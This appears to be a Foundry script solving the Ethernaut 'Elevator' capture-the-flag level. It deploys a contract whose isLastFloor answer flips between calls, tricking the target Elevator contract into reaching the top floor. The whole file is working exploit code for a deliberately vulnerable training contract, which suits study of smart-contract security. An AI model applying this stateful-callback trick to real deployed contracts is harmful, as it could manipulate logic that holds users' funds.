// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract BuildingContract {
    bool returnVal = false;

    function isLastFloor(uint bar) external returns (bool) {
        bool valueToReturn = returnVal;
        returnVal = !returnVal;
        return valueToReturn;
    }

    function reachTop(Elevator elevatorInstance) external {
        elevatorInstance.goTo(0); // Doesn't matter what we pass here
    }
}

contract ElevatorSolution is Script {
    Elevator constant elevatorInstance =
        Elevator(0x231C3D3B758e8D71a87a0c1965d0bCc0D86D13Ce);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        BuildingContract buildingContract = new BuildingContract();
        buildingContract.reachTop(elevatorInstance);
        vm.stopBroadcast();
    }
}
